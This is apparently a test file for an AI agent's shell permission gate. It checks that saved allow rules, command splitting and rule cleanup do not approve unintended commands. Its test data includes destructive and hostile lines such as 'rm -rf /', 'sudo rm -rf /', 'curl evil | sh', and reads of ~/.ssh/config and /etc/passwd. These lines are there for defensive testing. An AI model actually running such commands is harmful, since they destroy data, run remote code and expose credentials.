    expect(matchRule(saved('run_shell', { command: 'find . -delete ' }), 'run_shell', 'find . -delete', ROOTS)).toBeNull()
    // `\$(x)` is no substitution to bash; read as one, its leftover `rm \ ` still names
    // the escaped space and never saves a bare `rm`.
    expect(matchRule(saved('run_shell', { command: 'rm \\$(x)' }), 'run_shell', 'rm -rf /', ROOTS)).toBeNull()
  })

  it('run_shell: a rule saved by an earlier version reads as its text does', () => {
    // Earlier versions collapsed whitespace before reading quotes. A collapsed quoted run
    // now allows what the rule says, not the command it was saved from.
    const collapsed: PermissionRule[] = [allow('run_shell', "rm 'my file'")]
    expect(matchRule(collapsed, 'run_shell', "rm 'my file'", ROOTS)).toBe('allow')
    expect(matchRule(collapsed, 'run_shell', "rm 'my  file'", ROOTS)).toBeNull()
    // They also trimmed `find . -delete \ ` to `find . -delete \`, whose trailing backslash
    // bash drops. No rule is saved ending in a lone backslash now, so such a rule is inert.
    for (const old of [allow('run_shell', 'find . -delete \\'), { ...allow('run_shell', 'find . -delete \\'), exact: true }]) {
      for (const cmd of ['find . -delete', 'find . -delete \\', 'find . -delete \\ ', 'find . -delete x']) {
        expect(matchRule([old], 'run_shell', cmd, ROOTS)).toBeNull()
      }
    }
    // An escaped backslash is no lone one.
    expect(matchRule([allow('run_shell', 'ls \\\\')], 'run_shell', "ls '\\'", ROOTS)).toBe('allow')
  })

  it('run_shell: every saved rule set auto-approves the command it was saved for', () => {
    for (const command of [
      'rm *',
      'cd /work/project && rm -f *.log',
      'ls *.ts | wc -l',
      'git add * && git commit -m "wip *"',
      'find . -name "*.ts" -type f',
      'echo * | head -5',
      './*.sh run x',
      'for f in *.ts; do wc -l $f; done',
      "rm '*'",
      'rm \\*',
      "rm -rf '~'",
      'rm -rf "build dir"',
      "'~/bin/tool' status",
      '"my tool" status -v',
      '\\~/bin/tool status',
      'echo "$HOME" | wc -c',
      `git commit -m "it's done"`,
      `"git" 'status' && r''m -f "a b"`,
      "rm $'\\x2a'",
      "./$'\\x2a'.sh run",
      "$'git' status -s",
      "$'\\x72m' -f $'a\\tb' $'it\\'s'",
      "printf $'%s\\n' x | wc -l",
      'echo $"hi" $$ "$HOME"',
      'git status && "cd"k deploy',
      "\\g\\it $'status' -s",
      '\\sudo rm -rf /tmp/build',
      "t'ail' -n \"5\"",
      'cd - && npm test',
      'cd && cd .ssh && cat config',
      'pushd src && make && popd',
      'cd $PWD/.. && ls',
      'cd {..,} && cat config',
      'cd $(echo ~/).ssh && cat config',
      'cd ~/.ssh && cat config',
      'cd /etc && git status',
      "'' rm -rf /",
      "rm '' -rf x",
      "'' rm -rf / && git status",
      `git commit -m '' && printf "%s\\n" "" $'' | wc -l`,
      "ls '",
      'find . -delete \\ ',
      'find . -delete \\\t && ls',
      "rm   'my  file'",
      'rm \\  -rf x',
      'rm \\ -rf x',
      "grep 'a\tb' notes.txt",
      "printf $'%s  %s' a b",
      'find . -name x -exec rm {} \\;',
      'echo hi \\',
      'find . -delete ',
      'git status\r',
      'rm \\$(x)'
    ]) {
      expect(matchRule(saved('run_shell', { command }), 'run_shell', command, ROOTS), command).toBe('allow')
    }
  })

  it('run_shell: a saved directory change covers that one only', () => {
    const bare = saved('run_shell', { command: 'cd && make' })
    for (const cmd of ['cd /etc && make', 'cd ~/.ssh && make', 'cd - && make', 'cd -P && make']) {
      expect(matchRule(bare, 'run_shell', cmd, ROOTS), cmd).toBeNull()
    }
    const back = saved('run_shell', { command: 'cd - && make' })
    expect(matchRule(back, 'run_shell', 'cd - && make -j4', ROOTS)).toBe('allow')
    expect(matchRule(back, 'run_shell', 'cd - x && make', ROOTS)).toBeNull()
  })

  it('run_shell: an escaped or quoted wrapper is not generalized into a `sudo rm` rule', () => {
    for (const command of ['\\sudo rm -rf /tmp/build', "s'udo' rm -rf /tmp/build", "$'sudo' rm -rf /tmp/build"]) {
      const rules = saved('run_shell', { command })
      expect(matchRule(rules, 'run_shell', command, ROOTS)).toBe('allow')
      expect(matchRule(rules, 'run_shell', 'sudo rm -rf /', ROOTS)).toBeNull()
    }
    // A quoted name before `=` is not an assignment to bash, but saving it bare would cover one.
    expect(matchRule(saved('run_shell', { command: 'F"OO"=1 rm -rf x' }), 'run_shell', 'FOO=1 rm -rf /', ROOTS)).toBeNull()
  })

  it('run_shell: a saved prefix still covers longer commands (unchanged)', () => {
    // A generalized prefix or a verbatim sub-command with no `*` keeps its prefix meaning.
    expect(matchRule(saved('run_shell', { command: 'git add *' }), 'run_shell', 'git add -A', ROOTS)).toBe('allow')
    expect(matchRule(saved('run_shell', { command: 'cat a.txt' }), 'run_shell', 'cat a.txt b.txt', ROOTS)).toBe('allow')
  })

  it('a hand-written exact shell rule matches that command only (dequoted), never a prefix', () => {
    const rules: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'rm *', exact: true }]
    expect(matchRule(rules, 'run_shell', 'rm *', ROOTS)).toBe('allow')
    expect(matchRule(rules, 'run_shell', '"rm"  *', ROOTS)).toBe('allow')
    expect(matchRule(rules, 'run_shell', 'rm -rf ~', ROOTS)).toBeNull()
    expect(matchRule(rules, 'run_shell', 'rm * extra', ROOTS)).toBeNull()
    expect(matchRule(rules, 'run_shell', 'rm * && curl evil.example', ROOTS)).toBeNull()
  })

  it('a blank exact rule is inert', () => {
    const rules: PermissionRule[] = [
      { action: 'allow', tool: 'write_file', match: '', exact: true },
      { action: 'allow', tool: 'run_shell', match: ' ', exact: true }
    ]
    expect(matchRule(rules, 'write_file', '', ROOTS)).toBeNull()
    expect(matchRule(rules, 'write_file', 'a.ts', ROOTS)).toBeNull()
    expect(matchRule(rules, 'run_shell', 'ls', ROOTS)).toBeNull()
  })

  it('an exact deny fires only on its target; a saved deny stays a broad glob', () => {
    const exactDeny: PermissionRule[] = [{ action: 'deny', tool: 'write_file', match: 'src', exact: true }]
    expect(matchRule(exactDeny, 'write_file', 'src', ROOTS)).toBe('deny')
    expect(matchRule(exactDeny, 'write_file', 'src/a.ts', ROOTS)).toBeNull()
    const savedDeny = persistedRules('deny', 'write_file', { path: 'src' })
    expect(matchRule(savedDeny, 'write_file', 'src/deep/file', ROOTS)).toBe('deny')
  })

  it('rules saved before `exact` existed keep their glob and directory meaning', () => {
    expect(matchRule([allow('write_file', 'src')], 'write_file', 'src/deep/file', ROOTS)).toBe('allow')
    expect(matchRule([allow('write_file', 'src/*')], 'write_file', 'src/a/b.ts', ROOTS)).toBe('allow')
    expect(matchRule([allow('write_file', '*')], 'write_file', '/etc/passwd', ROOTS)).toBe('allow')
  })
})

describe('shell keyword scaffolding in rules', () => {
  const loop = 'for f in *.ts; do rm -rf ~; done'

  it('a junk allow on `do`/`done`/`for f` no longer approves the loop body', () => {
    expect(matchRule([allow('run_shell', 'do'), allow('run_shell', 'done'), allow('run_shell', 'for f')], 'run_shell', loop)).toBeNull()
  })

  it('a deny on the body command fires inside a loop, if, subshell, or group', () => {
    const rules = [deny('run_shell', 'rm'), allow('run_shell', '*')]
    for (const cmd of [loop, 'if true; then rm -rf ~; fi', '(rm -rf ~)', '{ rm -rf ~; }', '! rm -rf ~', 'time rm -rf ~']) {
      expect(matchRule(rules, 'run_shell', cmd)).toBe('deny')
    }
  })

  it('an allow on the body command approves the whole loop', () => {
    expect(matchRule([allow('run_shell', 'wc -l')], 'run_shell', 'for f in *.ts; do wc -l $f; done')).toBe('allow')
  })
})

describe('splitShellCommand', () => {
  it('splits on the shell control operators', () => {
    expect(splitShellCommand('a && b || c ; d | e & f')).toEqual(['a', 'b', 'c', 'd', 'e', 'f'])
  })

  it('does not split on an & that is part of a file-descriptor redirection', () => {
    expect(splitShellCommand('npm run dev > /tmp/vite.log 2>&1')).toEqual(['npm run dev > /tmp/vite.log 2>&1'])
    expect(splitShellCommand('make &>/dev/null')).toEqual(['make &>/dev/null'])
    expect(splitShellCommand('make &>> build.log')).toEqual(['make &>> build.log'])
    expect(splitShellCommand('echo oops >&2')).toEqual(['echo oops >&2'])
    expect(splitShellCommand('read x <&3')).toEqual(['read x <&3'])
  })

  it('keeps a trailing escaped or non-blank space on a sub-command', () => {
    // `\ ` is an argument to bash, and only space, tab, and newline separate words.
    expect(splitShellCommand('find . -delete \\  && ls  ')).toEqual(['find . -delete \\ ', 'ls'])
    expect(splitShellCommand('find . -delete\u00a0; ls')).toEqual(['find . -delete\u00a0', 'ls'])
    expect(splitShellCommand("echo 'a\\' ; ls")).toEqual(["echo 'a\\'", 'ls'])
  })

  it('still splits a background & and the operators around a redirection', () => {
    // The real command that produced a phantom `1` segment (and an "Always allow" rule
    // matching `1`): a redirect followed by a background `&` and a newline.
    expect(
      splitShellCommand('python manage.py runserver > /tmp/django.log 2>&1 &\nsleep 2 && cat /tmp/django.log')
    ).toEqual(['python manage.py runserver > /tmp/django.log 2>&1', 'sleep 2', 'cat /tmp/django.log'])
    expect(splitShellCommand('build 2>&1 | tee out.log')).toEqual(['build 2>&1', 'tee out.log'])
    expect(splitShellCommand('a >&2; rm -rf x')).toEqual(['a >&2', 'rm -rf x'])
    expect(splitShellCommand('a & b')).toEqual(['a', 'b'])
    expect(splitShellCommand('a |& b')).toEqual(['a', 'b'])
  })

  it('keeps deny and allow matching strict across a redirection', () => {
    const deny: PermissionRule = { action: 'deny', tool: 'run_shell', match: 'rm -rf*' }
    expect(matchRule([deny], 'run_shell', 'rm -rf build 2>&1')).toBe('deny')
    expect(matchRule([deny], 'run_shell', 'echo hi >&2; rm -rf build')).toBe('deny')
    // An allow for the first command must not cover a chained second one.
    expect(matchRule([allow('run_shell', 'echo *')], 'run_shell', 'echo hi >&2 && rm -rf x')).toBeNull()
    expect(matchRule([allow('run_shell', 'npm run *')], 'run_shell', 'npm run build > /tmp/b.log 2>&1')).toBe('allow')
  })

  it('extracts command-substitution and backtick bodies as their own segments', () => {
    expect(splitShellCommand('echo $(whoami)')).toContain('whoami')
    expect(splitShellCommand('echo `id`')).toContain('id')
  })

  it('extracts a substitution body even when it contains balanced parens', () => {
    expect(splitShellCommand('echo $(rm -rf ~/x "()")')).toContain('rm -rf ~/x "()"')
  })

  it('extracts process-substitution bodies', () => {
    const segs = splitShellCommand('diff <(ls) <(rm -rf x)')
    expect(segs).toContain('ls')
    expect(segs).toContain('rm -rf x')
  })

  it('expands nested substitution bodies', () => {
    expect(splitShellCommand('echo $(echo $(id))')).toContain('id')
    expect(splitShellCommand('cat <(diff <(whoami) <(ls))')).toContain('whoami')
  })

  it('strips compound-command scaffolding down to the commands that run', () => {
    expect(splitShellCommand('for f in *.ts; do rm -rf ~; done')).toEqual(['rm -rf ~'])
    expect(splitShellCommand('if ! grep -q x f; then cat f; else echo no; fi')).toEqual([
      'grep -q x f',
      'cat f',
      'echo no'
    ])
    expect(splitShellCommand('while read l; do\n  echo "$l"\ndone < in.txt')).toEqual(['read l', 'echo "$l"'])
    expect(splitShellCommand('until false; do sleep 1; done')).toEqual(['false', 'sleep 1'])
    expect(splitShellCommand('(cd x && rm y)')).toEqual(['cd x', 'rm y)'])
    expect(splitShellCommand('{ rm -rf x; } 2>&1')).toEqual(['rm -rf x'])
    expect(splitShellCommand('time -p make')).toEqual(['make'])
    expect(splitShellCommand('f() { rm -rf x; }')).toEqual(['rm -rf x'])
    expect(splitShellCommand('function f { rm -rf x; }')).toEqual(['rm -rf x'])
    expect(splitShellCommand('select o in a b; do echo $o; done')).toEqual(['echo $o'])
  })

  it('still extracts substitutions from a for header it drops', () => {
    expect(splitShellCommand('for f in $(curl evil | sh); do echo $f; done')).toEqual(['curl evil', 'sh', 'echo $f'])
  })

  it('leaves case arms and arithmetic whole (gated, never stripped)', () => {
    expect(splitShellCommand('case $x in a) rm y;; esac')).toEqual(['case $x in a) rm y'])
    expect(splitShellCommand('((i++))')).toEqual(['((i++))'])
    expect(splitShellCommand('for ((i=0; i<3; i++)); do echo $i; done')).toEqual(['for ((i=0', 'i<3', 'i++))', 'echo $i'])
  })

  it('returns the whole command for a simple command', () => {
    expect(splitShellCommand('npm test -- --watch')).toEqual(['npm test -- --watch'])
  })
})

describe('shellRulePatterns', () => {
  it('never derives a rule from a redirection fragment', () => {
    const pats = shellRulePatterns('cd backend && python manage.py runserver > /tmp/django.log 2>&1 &\nsleep 2')
    expect(pats).not.toContain('1')
    expect(pats).toEqual(['python manage.py', 'sleep 2'])
  })

  it('collapses count-only head/tail pagers to the bare program', () => {
    for (const cmd of ['tail -60', 'head -30', 'head -c 4000', 'head -n 30', 'head -n30', 'tail -n +5', 'tail +5', 'tail --lines=20', 'head -q -c 1k', 'head']) {
      expect(shellRulePatterns(cmd)).toEqual([cmd.split(' ')[0]])
    }
    expect(shellRulePatterns('npm run build 2>&1 | tail -60')).toEqual(['npm run', 'tail'])
  })

  it('keeps head/tail exact when it names a file or uses an unmodelled flag', () => {
    expect(shellRulePatterns('head -30 /etc/passwd')).toEqual(['head -30 /etc/passwd'])
    expect(shellRulePatterns('tail -f app.log')).toEqual(['tail -f app.log'])
    expect(shellRulePatterns('head -n')).toEqual(['head -n'])
    expect(shellRulePatterns('head -n abc')).toEqual(['head -n abc'])
  })

  it('never mints a rule for shell keywords or loop headers', () => {
    expect(shellRulePatterns('for f in *.ts; do wc -l $f; done')).toEqual(['wc -l $f'])
    expect(shellRulePatterns('if [ -f x ]; then cat x; fi')).toEqual(['[ -f x ]', 'cat x'])
  })

  it('drops the `cd` prelude and generalizes to a <program> <verb> prefix', () => {
    expect(shellRulePatterns('cd /Users/me/repo && npm install lodash')).toEqual(['npm install'])
    expect(shellRulePatterns('cd /work/project && git status')).toEqual(['git status'])
  })

  it('keeps a directory change the gate would prompt for, verbatim', () => {
    // Bash takes these targets from $HOME, $OLDPWD, the directory stack, or an
    // expansion, so the matcher gates them and a saved rule set has to cover them.
    expect(shellRulePatterns('cd - && npm test')).toEqual(['cd -', 'npm test'])
    expect(shellRulePatterns('cd && make')).toEqual(['cd', 'make'])
    expect(shellRulePatterns('pushd src && make && popd')).toEqual(['make', 'popd'])
    expect(shellRulePatterns('cd $PWD/.. status && ls')).toEqual(['cd $PWD/.. status', 'ls'])
    expect(shellRulePatterns('cd {..,} && ls')).toEqual(['cd {..,}', 'ls'])
    // A literal one is dropped as before; given the run's roots, one out of them is kept.
    expect(shellRulePatterns('cd ~/.ssh && cat config')).toEqual(['cat config'])
    expect(shellRulePatterns('cd ~/.ssh && cat config', ['/work/project'])).toEqual(['cd ~/.ssh', 'cat config'])
    expect(shellRulePatterns('cd /work/project && cat config', ['/work/project'])).toEqual(['cat config'])
  })

  it('collapses differing trailing args onto the same prefix', () => {
    // The point: two near-identical commands produce ONE identical rule.
    expect(shellRulePatterns('npm install foo bar')).toEqual(['npm install'])
    expect(shellRulePatterns('git commit -m "a long unique message"')).toEqual(['git commit'])
    expect(shellRulePatterns('npm install foo')[0]).toBe(shellRulePatterns('npm install baz')[0])
  })

  it('keeps raw file operations exact rather than broadening to the bare program', () => {
    // `rm`/`cat` must NOT generalize to `rm`/`cat` (which would allow any target).
    expect(shellRulePatterns('rm -rf build')).toEqual(['rm -rf build'])
    expect(shellRulePatterns('cat src/index.ts')).toEqual(['cat src/index.ts'])
  })

  it('keeps env-prefixed commands exact (the prefix is part of what runs)', () => {
    expect(shellRulePatterns('FOO=1 npm run build')).toEqual(['FOO=1 npm run build'])
  })

  it('never generalizes a program spelled with `*` (its prefix would be a glob over programs)', () => {
    expect(shellRulePatterns('./*.sh run x')).toEqual(['./*.sh run x'])
    expect(shellRulePatterns('"*" status')).toEqual(['"*" status'])
    // A `*` past the verb is dropped with the trailing args, as before.
    expect(shellRulePatterns('git add *')).toEqual(['git add'])
  })

  it('keeps a program verbatim when its prefix would drop quoting that matters', () => {
    expect(shellRulePatterns("'~/bin/tool' status")).toEqual(["'~/bin/tool' status"])
    expect(shellRulePatterns('"my tool" status -v')).toEqual(['"my tool" status -v'])
    expect(shellRulePatterns('"$HOME/bin/x" run')).toEqual(['"$HOME/bin/x" run'])
    // An escape that matters is quoting too.
    expect(shellRulePatterns('\\~/bin/tool status -v')).toEqual(['\\~/bin/tool status -v'])
    // Quoting or escaping that changes nothing still generalizes.
    expect(shellRulePatterns(`"git" 'status' -s`)).toEqual(['git status'])
    expect(shellRulePatterns("\\g\\it $'status' -s")).toEqual(['git status'])
  })

  it('reads the program and verb as the words bash runs', () => {
    // `"cd"k` is the program `cdk`, not a `cd` prelude to drop.
    expect(shellRulePatterns('git status && "cd"k deploy')).toEqual(['git status', 'cdk deploy'])
    expect(shellRulePatterns('"cd" /work/project && git status')).toEqual(['git status'])
    // A quoted or escaped wrapper or env prefix is still one, so it stays verbatim.
    for (const cmd of ['\\sudo rm -rf /tmp/build', "s'udo' rm -rf /tmp/build", "$'sudo' rm -rf /tmp/build", 'F"OO"=1 rm -rf x']) {
      expect(shellRulePatterns(cmd)).toEqual([cmd])
    }
    expect(shellRulePatterns("t'ail' -n \"5\"")).toEqual(['tail'])
    // An empty quoted program is a word too (bash runs nothing), not a sub-command to drop.
    expect(shellRulePatterns("'' rm -rf / && git status")).toEqual(["'' rm -rf /", 'git status'])
  })

  it('keeps quoted and escaped whitespace as written, collapsing only unquoted blanks', () => {
    expect(shellRulePatterns('  find  .  -delete \\ ')).toEqual(['find . -delete \\ '])
    expect(shellRulePatterns("rm\t'my  file'   x")).toEqual(["rm 'my  file' x"])
    expect(shellRulePatterns('rm \\  -rf x')).toEqual(['rm \\  -rf x'])
    expect(shellRulePatterns("printf $'%s\t %s' a")).toEqual(["printf $'%s\t %s' a"])
    expect(shellRulePatterns('git  status   -s')).toEqual(['git status'])
    // A trailing lone backslash adds nothing to what bash runs, so it is not saved.
    expect(shellRulePatterns('find . -name x -exec rm {} \\;')).toEqual(['find . -name x -exec rm {}'])
    expect(shellRulePatterns('ls -la \\')).toEqual(['ls -la'])
  })

  it('keeps command-wrapper-prefixed commands exact (never broadens to `sudo rm`)', () => {
    // A wrapper's second token is a program, not a sub-command verb — generalizing
    // `sudo rm -rf /tmp/build` to `sudo rm` would then auto-approve `sudo rm -rf /`.
    expect(shellRulePatterns('sudo rm -rf /tmp/build')).toEqual(['sudo rm -rf /tmp/build'])
    expect(shellRulePatterns('sudo apt install foo')).toEqual(['sudo apt install foo'])
    expect(shellRulePatterns('xargs rm')).toEqual(['xargs rm'])
    expect(shellRulePatterns('nohup npm run dev')).toEqual(['nohup npm run dev'])
    // A non-wrapper program still generalizes to <program> <verb> (no regression).
    expect(shellRulePatterns('git status -s')).toEqual(['git status'])
  })

  it('emits one prefix per non-cd sub-command of a compound command', () => {
    expect(shellRulePatterns('cd /r && npm ci && npm run build')).toEqual(['npm ci', 'npm run'])
  })

  it('dedupes identical prefixes within one command', () => {
    expect(shellRulePatterns('git add . && git add -A')).toEqual(['git add'])
  })

  it('never returns an empty list', () => {
    expect(shellRulePatterns('cd /somewhere')).toEqual(['cd /somewhere'])
    expect(shellRulePatterns('')).toEqual([''])
  })

  it('produces a prefix the matcher actually allows for the original command', () => {
    const rules = shellRulePatterns('cd /r && npm install foo').map((m) => allow('run_shell', m))
    expect(matchRule(rules, 'run_shell', 'cd /r && npm install foo', ['/r'])).toBe('allow')
    // ...and for a sibling command with different args.
    expect(matchRule(rules, 'run_shell', 'npm install something-else')).toBe('allow')
  })
})

describe('alreadyAllowedAsRule', () => {
  it('is true when a broader shell rule already covers the sample', () => {
    expect(alreadyAllowedAsRule([allow('run_shell', 'git *')], 'run_shell', 'git status')).toBe(true)
    expect(alreadyAllowedAsRule([allow('run_shell', 'npm install')], 'run_shell', 'npm install')).toBe(true)
  })

  it('is false when nothing allows it (or a deny matches first)', () => {
    expect(alreadyAllowedAsRule([allow('run_shell', 'git *')], 'run_shell', 'npm ci')).toBe(false)
    expect(alreadyAllowedAsRule([deny('run_shell', 'git *')], 'run_shell', 'git status')).toBe(false)
    expect(alreadyAllowedAsRule([], 'run_shell', 'ls')).toBe(false)
  })

  it('reads a shell sample as written, quoted whitespace included', () => {
    expect(alreadyAllowedAsRule([allow('run_shell', "rm 'my file'")], 'run_shell', "rm 'my  file'")).toBe(false)
    expect(alreadyAllowedAsRule([allow('run_shell', 'find . -delete \\ ')], 'run_shell', 'find . -delete \\ ')).toBe(true)
    expect(alreadyAllowedAsRule([allow('run_shell', 'git  status')], 'run_shell', 'git status')).toBe(true)
  })

  it('handles non-shell tools via the subject matcher', () => {
    expect(alreadyAllowedAsRule([allow('web_fetch', 'https://x.com')], 'web_fetch', 'https://x.com/a')).toBe(true)
    expect(alreadyAllowedAsRule([allow('read_file', 'src')], 'read_file', 'src/a.ts')).toBe(true)
  })

  it('anchors a relative sample to the run roots, so it agrees with the gate', () => {
    const roots = ['/work/project']
    const absRule = [allow('write_file', '/work/project/a.ts')]
    expect(matchRule(absRule, 'write_file', 'a.ts', roots)).toBe('allow')
    expect(alreadyAllowedAsRule(absRule, 'write_file', 'a.ts', roots)).toBe(true)
    // A rule for the same name under the process cwd is a different file to the gate.
    const cwdRule = [allow('write_file', join(process.cwd(), 'a.ts'))]
    expect(matchRule(cwdRule, 'write_file', 'a.ts', roots)).toBeNull()
    expect(alreadyAllowedAsRule(cwdRule, 'write_file', 'a.ts', roots)).toBe(false)
  })

  it('an exact rule covers only its own target', () => {
    const exact: PermissionRule[] = [{ action: 'allow', tool: 'write_file', match: 'src', exact: true }]
    expect(alreadyAllowedAsRule(exact, 'write_file', 'src')).toBe(true)
    expect(alreadyAllowedAsRule(exact, 'write_file', 'src/a.ts')).toBe(false)
  })
})

describe('cleanupPermissionRules', () => {
  it('never rewrites a quoted program into a bare one, or a quoted `*` into a glob', () => {
    expect(cleanupPermissionRules([allow('run_shell', "cd /r && '~/bin/tool' status -v")])).toEqual([
      allow('run_shell', "'~/bin/tool' status -v")
    ])
    // Two exact rules a quote tells apart are both kept: neither covers the other.
    const both: PermissionRule[] = [
      { action: 'allow', tool: 'run_shell', match: 'rm *', exact: true },
      { action: 'allow', tool: 'run_shell', match: "rm '*'", exact: true }
    ]
    expect(cleanupPermissionRules(both)).toEqual(both)
  })

  it('collapses a pile of exact cd-prefixed commands into a handful of prefixes', () => {
    const messy: PermissionRule[] = [
      allow('run_shell', 'cd /Users/me/repo && npm install foo'),
      allow('run_shell', 'cd /Users/me/repo && npm install bar baz'),
      allow('run_shell', 'cd /Users/me/repo && git status'),
      allow('run_shell', 'cd /Users/me/repo && git status -s')
    ]
    expect(cleanupPermissionRules(messy)).toEqual([
      allow('run_shell', 'npm install'),
      allow('run_shell', 'git status')
    ])
  })

  it('preserves non-shell, deny, and ask rules verbatim (only exact dedupe)', () => {
    const rules: PermissionRule[] = [
      deny('run_shell', 'rm -rf /'),
      { action: 'ask', tool: 'write_file', match: '**' },
      allow('web_fetch', 'https://api.example.com'),
      allow('web_fetch', 'https://api.example.com')
    ]
    expect(cleanupPermissionRules(rules)).toEqual([
      deny('run_shell', 'rm -rf /'),
      { action: 'ask', tool: 'write_file', match: '**' },
      allow('web_fetch', 'https://api.example.com')
    ])
  })

  it('does NOT generalize an allow when doing so would shadow a narrower deny', () => {
    const rules: PermissionRule[] = [
      deny('run_shell', 'git push --force'),
      allow('run_shell', 'cd /r && git push origin main')
    ]
    // The allow stays exact so `git push` never auto-approves the force-push.
    expect(cleanupPermissionRules(rules)).toEqual([
      deny('run_shell', 'git push --force'),
      allow('run_shell', 'cd /r && git push origin main')
    ])
    expect(matchRule(cleanupPermissionRules(rules), 'run_shell', 'git push --force')).toBe('deny')
  })

  it('does NOT generalize an allow when a WILDCARD deny would be shadowed', () => {
    // The one-directional literal shadow check missed this: generalizing
    // `git push --force origin main` to `git push` overlaps `* --force*` only on the
    // extended `git push --force …`, so the allow must be kept exact.
    const rules: PermissionRule[] = [
      allow('run_shell', 'git push --force origin main'),
      deny('run_shell', '* --force*')
    ]
    const cleaned = cleanupPermissionRules(rules)
    expect(cleaned).toEqual([
      allow('run_shell', 'git push --force origin main'),
      deny('run_shell', '* --force*')
    ])
    // A DIFFERENT force-push (not covered by the exact allow) is still denied — proof the
    // generalization did not open a hole. A benign `git status` was never allowed here.
    expect(matchRule(cleaned, 'run_shell', 'git push --force some-other-remote')).toBe('deny')
    expect(matchRule(cleaned, 'run_shell', 'git commit --force')).toBe('deny')
  })

  it('drops an allow already covered by an earlier broader allow', () => {
    const rules: PermissionRule[] = [allow('run_shell', 'git *'), allow('run_shell', 'git status')]
    expect(cleanupPermissionRules(rules)).toEqual([allow('run_shell', 'git *')])
  })

  it('is a no-op (idempotent) on already-clean generalized rules', () => {
    const clean: PermissionRule[] = [allow('run_shell', 'npm install'), allow('run_shell', 'git status')]
    expect(cleanupPermissionRules(clean)).toEqual(clean)
    expect(cleanupPermissionRules(cleanupPermissionRules(clean))).toEqual(clean)
  })

  it('drops an allow covered by a LATER broader allow', () => {
    const rules: PermissionRule[] = [
      allow('run_shell', 'ls -la "../Source Files/"'),
      allow('run_shell', 'npm run'),
      allow('run_shell', 'ls -la')
    ]
    expect(cleanupPermissionRules(rules)).toEqual([
      allow('run_shell', 'npm run'),
      allow('run_shell', 'ls -la')
    ])
  })

  it('keeps a narrow allow when a deny or ask overlaps it, even if a later allow covers it', () => {
    for (const gate of [deny('run_shell', 'ls -la /secret*'), { action: 'ask' as const, tool: 'run_shell', match: 'ls -la /secret*' }]) {
      const rules: PermissionRule[] = [allow('run_shell', 'ls -la /secret/ok'), gate, allow('run_shell', 'ls -la')]
      const cleaned = cleanupPermissionRules(rules)
      expect(cleaned).toEqual(rules)
      expect(matchRule(cleaned, 'run_shell', 'ls -la /secret/ok')).toBe('allow')
    }
  })

  it('does not drop a prefix allow that only a narrower glob covers', () => {
    // `ls -l?` matches `ls -la` but not `ls -la dir`, so it does not cover the prefix rule.
    const rules: PermissionRule[] = [allow('run_shell', 'ls -la'), allow('run_shell', 'ls -l?')]
    expect(cleanupPermissionRules(rules)).toEqual(rules)
  })

  it('migrates saved per-count head/tail rules onto one rule each', () => {
    const rules: PermissionRule[] = [
      allow('run_shell', 'head -30'),
      allow('run_shell', 'tail -60'),
      allow('run_shell', 'head -c 4000'),
      allow('run_shell', 'head -30 notes.txt')
    ]
    // `head -30 notes.txt` is covered by the generalized `head`, so it goes too.
    expect(cleanupPermissionRules(rules)).toEqual([allow('run_shell', 'head'), allow('run_shell', 'tail')])
  })

  it('keeps a head rule exact when generalizing would shadow a deny', () => {
    const rules: PermissionRule[] = [allow('run_shell', 'head -30'), deny('run_shell', 'head * /etc/*')]
    expect(cleanupPermissionRules(rules)).toEqual(rules)
  })

  it('migrates keyword-scaffolding rules: drops pure scaffolding, unwraps prefixed ones', () => {
    const rules: PermissionRule[] = [
      allow('run_shell', 'for f'),
      allow('run_shell', 'do wc'),
      allow('run_shell', 'done'),
      allow('run_shell', 'then cat'),
      allow('run_shell', 'fi')
    ]
    expect(cleanupPermissionRules(rules)).toEqual([allow('run_shell', 'wc'), allow('run_shell', 'cat')])
  })

  it('keeps a keyword-prefixed allow exact when unwrapping would shadow a deny', () => {
    const rules: PermissionRule[] = [allow('run_shell', 'do rm'), deny('run_shell', 'rm -rf*')]
    expect(cleanupPermissionRules(rules)).toEqual(rules)
  })

  it('purges dead fragments left by the old `2>&1` split', () => {
    const rules: PermissionRule[] = [
      allow('run_shell', 'python3 -m venv --help >/dev/null 2>'),
      allow('run_shell', '1'),
      allow('run_shell', 'echo venv-ok'),
      deny('run_shell', '2')
    ]
    expect(cleanupPermissionRules(rules)).toEqual([allow('run_shell', 'echo venv-ok'), deny('run_shell', '2')])
  })

  it('drops a shell allow ending in a lone backslash, which no saved rule ends in now', () => {
    const rules: PermissionRule[] = [
      allow('run_shell', 'find . -delete \\'),
      { action: 'allow', tool: 'run_shell', match: 'find . -name x -exec rm {} \\', exact: true },
      allow('run_shell', 'git status'),
      deny('run_shell', 'curl x \\')
    ]
    expect(cleanupPermissionRules(rules)).toEqual([allow('run_shell', 'git status'), deny('run_shell', 'curl x \\')])
    // An escaped trailing space, or an escaped backslash, is no lone backslash.
    const kept: PermissionRule[] = [allow('run_shell', 'find . -delete \\ '), allow('run_shell', 'ls \\\\')]
    expect(cleanupPermissionRules(kept)).toEqual(kept)
    expect(cleanupPermissionRules([allow('run_shell', "rm   'my  file'")])).toEqual([allow('run_shell', "rm 'my  file'")])
  })

  describe('exact rules', () => {
    const exactAllow = (tool: string, match: string): PermissionRule => ({ action: 'allow', tool, match, exact: true })

    it('keeps an exact shell allow exact (never re-generalized into a prefix)', () => {
      const rules = [exactAllow('run_shell', 'cd /repo && npm install foo'), exactAllow('run_shell', 'rm *')]
      expect(cleanupPermissionRules(rules)).toEqual(rules)
    })

    it('never drops a broader rule as covered by an earlier exact one', () => {
      const rules = [
        exactAllow('write_file', 'src'),
        allow('write_file', 'src'),
        exactAllow('run_shell', 'git status'),
        allow('run_shell', 'git status')
      ]
      // Both broader rules survive. The exact shell rule goes instead: the later prefix
      // allow covers it and no deny or ask overlaps it.
      expect(cleanupPermissionRules(rules)).toEqual([
        exactAllow('write_file', 'src'),
        allow('write_file', 'src'),
        allow('run_shell', 'git status')
      ])
    })

    it('drops an exact rule a broader earlier allow already covers, and exact duplicates', () => {
      const rules = [
        allow('write_file', 'src'),
        exactAllow('write_file', 'src/a.ts'),
        allow('write_file', 'x*'),
        exactAllow('write_file', 'x*'),
        exactAllow('web_fetch', 'https://a.example/*'),
        exactAllow('web_fetch', 'https://a.example/*')
      ]
      expect(cleanupPermissionRules(rules)).toEqual([
        allow('write_file', 'src'),
        allow('write_file', 'x*'),
        exactAllow('web_fetch', 'https://a.example/*')
      ])
    })

    it('keeps an exact `x*` that a glob allow for `x` (a directory) does not cover', () => {
      const rules = [allow('write_file', 'x'), exactAllow('write_file', 'x*')]
      expect(cleanupPermissionRules(rules)).toEqual(rules)
    })

